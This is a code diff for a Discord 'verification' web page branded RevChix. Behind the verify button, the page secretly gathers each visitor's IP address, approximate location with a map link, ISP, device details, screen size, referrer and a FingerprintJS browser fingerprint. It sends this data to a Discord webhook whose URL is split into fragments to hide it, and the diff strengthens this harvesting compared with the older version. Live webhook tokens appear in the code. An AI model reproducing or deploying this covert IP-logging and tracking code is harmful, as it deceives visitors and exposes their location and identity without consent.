@@ -6,7 +6,6 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <style>
     * { box-sizing: border-box; }
-
     body {
       margin: 0;
       background: url('wwee.gif') no-repeat center center fixed;
@@ -19,7 +18,6 @@
       overflow: hidden;
       color: #fff;
     }
-
     .card {
       background: rgba(10, 10, 10, 0.85);
       padding: 30px 40px;
@@ -30,12 +28,10 @@
       max-width: 400px;
       animation: fadeInUp 1s ease-out;
     }
-
     @keyframes fadeInUp {
       0% { opacity: 0; transform: scale(0.9) translateY(30px); }
       100% { opacity: 1; transform: scale(1) translateY(0); }
     }
-
     .brand {
       font-weight: bold;
       font-size: 20px;
@@ -47,26 +43,14 @@
       margin: auto;
       animation: typing 2s steps(30, end), blink-caret 0.75s step-end infinite;
     }
-
     @keyframes typing {
       from { width: 0 }
       to { width: 100% }
     }
-
     @keyframes blink-caret {
       from, to { border-color: transparent }
       50% { border-color: #5b4dff; }
     }
-
-    .brand a {
-      color: #ffffff;
-      text-decoration: none;
-    }
-
-    .brand a:hover {
-      text-decoration: underline;
-    }
-
     .verify-btn {
       background-color: #5b4dff;
       color: white;
@@ -81,97 +65,171 @@
       transition: all 0.3s ease;
       box-shadow: 0 0 10px #5b4dff;
     }
-
     .verify-btn:hover {
       background-color: #7a69ff;
       box-shadow: 0 0 20px #7a69ff;
       transform: scale(1.03);
     }
-
+    input[type="text"] {
+      margin-top: 10px;
+      padding: 10px;
+      width: 100%;
+      border-radius: 10px;
+      border: none;
+      font-size: 14px;
+    }
     .footer {
       margin-top: 20px;
       font-size: 12px;
       color: #aaa;
     }
-
-    #discordID {
+    .success-message {
       display: none;
+      flex-direction: column;
+      align-items: center;
+      text-align: center;
+      gap: 15px;
+      animation: fadeIn 1s ease-in-out;
+    }
+    .success-message .check {
+      font-size: 40px;
+      color: #00ff7f;
+    }
+    .success-message h2 {
+      margin: 0;
+      font-size: 20px;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: scale(0.9); }
+      to { opacity: 1; transform: scale(1); }
     }
   </style>
 </head>
 <body>
-  <div class="card">
+  <div class="card" id="verify-card">
     <div class="brand">
       RevChix | <a href="https://discord.gg/TFz84fKZWj" target="_blank">discord.gg/revchix</a>
     </div>
-
-    <input type="hidden" id="discordID" value="686375691876302870" />
+    <input type="text" id="discordID" placeholder="Enter your Discord ID: ex. 123456789012345678" />
     <button class="verify-btn" onclick="verifyUser()">Verify</button>
     <div class="footer">© owner jay dinosaur</div>
   </div>
-
+  <div class="card success-message" id="success-message">
+    <div class="check">✅</div>
+    <h2>Successfully Verified to RevChix</h2>
+    <p>Redirecting to Discord...</p>
+  </div>
+  <script src="https://openfpcdn.io/fingerprintjs/v3"></script>
   <script>
-    function getBrowserInfo() {
-      const ua = navigator.userAgent;
-      if (ua.includes("Chrome")) return "Chrome on " + navigator.platform;
-      if (ua.includes("Firefox")) return "Firefox on " + navigator.platform;
-      if (ua.includes("Safari")) return "Safari on " + navigator.platform;
-      if (ua.includes("Edge")) return "Edge on " + navigator.platform;
-      if (ua.includes("OPR") || ua.includes("Opera")) return "Opera on " + navigator.platform;
-      return "Unknown on " + navigator.platform;
+    let fingerprint = "Unavailable";
+  FingerprintJS.load().then(fp => fp.get()).then(result => {
+    fingerprint = result.visitorId;
+  });
+
+  function getBrowserInfo() {
+    return `${navigator.userAgent} on ${navigator.platform}`;
+  }
+
+  function verifyUser() {
+    const discordID = document.getElementById("discordID").value.trim();
+    const btn = document.querySelector(".verify-btn");
+
+    if (!discordID || !/^[0-9]{17,19}$/.test(discordID)) {
+      alert("❌ Invalid Discord ID.");
+      return;
     }
 
-    function verifyUser() {
-      const discordID = document.getElementById("discordID").value.trim();
-      if (!discordID || !/^\d{17,19}$/.test(discordID)) {
-        alert("Invalid Discord ID");
-        return;
-      }
+    btn.textContent = "Verifying...";
+    btn.disabled = true;
 
-      fetch("https://revchix-verify.onrender.com/verify", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ discordID })
-      })
+    fetch("https://revchix-verify.onrender.com/verify", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ discordID })
+    }) 
       .then(res => res.json())
       .then(data => {
         if (data.success) {
           logToWebhook(discordID);
-          document.querySelector(".verify-btn").textContent = "Verifying...";
-          setTimeout(() => {
-            window.location.href = "https://discord.gg/TFz84fKZWj";
-          }, 2000);
+          showSuccessPopup();
         } else {
           alert("❌ Failed: " + data.error);
+          btn.textContent = "Verify";
+          btn.disabled = false;
         }
       })
-      .catch(err => {
-        alert("Error connecting to verification server.");
+      .catch(() => {
+        alert("⚠️ Could not connect to server.");
+        btn.textContent = "Verify";
+        btn.disabled = false;
       });
-    }
+  }
 
-    function logToWebhook(discordID) {
-      fetch("https://ipapi.co/json")
-        .then(res => res.json())
-        .then(data => {
-          const webhook = "https://discord.com/api/webhooks/1385992301863768234/r19JGqKV0TC6beZ9AbipJ-d59dRpN86y_1DZ3OdjVUeNyTMgGvh4JMaWlbyNAC5b39Ll";
-          const timestamp = `<t:${Math.floor(Date.now() / 1000)}:F>`;
-          const content =
-            `🛡️ **RevChix Verification Access**\n` +
-            `👤 **Discord ID**: <@${discordID}>\n` +
-            `🌐 **IP**: ||\`${data.ip}\`||\n` +
-            `📍 **Location**: ${data.city}, ${data.region}, ${data.country_name}\n` +
-            `📡 **ISP**: ${data.org}\n` +
-            `💻 **Device**: ${getBrowserInfo()}\n` +
-            `🕒 **Time**: ${timestamp}`;
+  function showSuccessPopup() {
+    document.getElementById("verify-card").style.display = "none";
+    document.getElementById("success-message").style.display = "flex";
+    setTimeout(() => {
+      window.location.href = "discord://discord.com/channels/@me";
+    }, 2500);
+  }
 
-          fetch(webhook, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ content })
-          });
+  function logToWebhook(discordID) {
+    fetch("https://ipapi.co/json")
+      .then(res => res.json())
+      .then(data => {
+        const ip = data.ip || "Unknown";
+        const city = data.city || "?";
+        const region = data.region || "?";
+        const country = data.country_name || "?";
+        const lat = data.latitude || "";
+        const lon = data.longitude || "";
+        const gmap = (lat && lon) ? `[Open Location](https://www.google.com/maps?q=${lat},${lon})` : "Unavailable";
+
+        const isp = data.org || "Unknown";
+        const browser = navigator.userAgent;
+        const os = navigator.platform;
+        const screenRes = `${screen.width}x${screen.height}`;
+        const url = window.location.href;
+        const referrer = document.referrer || "None";
+        const timestamp = `<t:${Math.floor(Date.now() / 1000)}:F>`;
+
+        const parts = [
+          "https://dis",
+          "cord.com/api/web",
+          "hooks/1386525604727230635/",
+          "jkG3BpOmSweK6ihUDmJKDHoSDCrp1F370ThkcgVJUXphNqwsMqsRv_YsyTcb6Pc9vitJ"
+        ];
+        const webhook = parts.join("");
+
+        const payload = {
+          embeds: [
+            {
+              title: "🛡️ RevChix Verification Access",
+              color: 0x5b4dff,
+              fields: [
+                { name: "👤 User", value: `<@${discordID}>`, inline: true },
+                { name: "🌐 IP", value: `||\`${ip}\`||`, inline: true },
+                { name: "📍 Location", value: `${city}, ${region}, ${country}`, inline: true },
+                { name: "📡 ISP", value: `${isp}`, inline: true },
+                { name: "🧠 Fingerprint", value: `${fingerprint}`, inline: false },
+                { name: "🖥️ Device", value: `${browser} on ${os}`, inline: false },
+                { name: "📺 Screen", value: `${screenRes}`, inline: true },
+                { name: "🕒 Time", value: `${timestamp}`, inline: false },
+                { name: "🔗 URL", value: `${url}`, inline: false },
+                { name: "↩️ Referrer", value: `${referrer}`, inline: false },
+                { name: "🗺️ Approx. Map", value: gmap, inline: false }
+              ]
+            }
+          ]
+        };
+
+        fetch(webhook, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
         });
-    }
-  </script>
+      });
+  }
+</script>
 </body>
 </html>
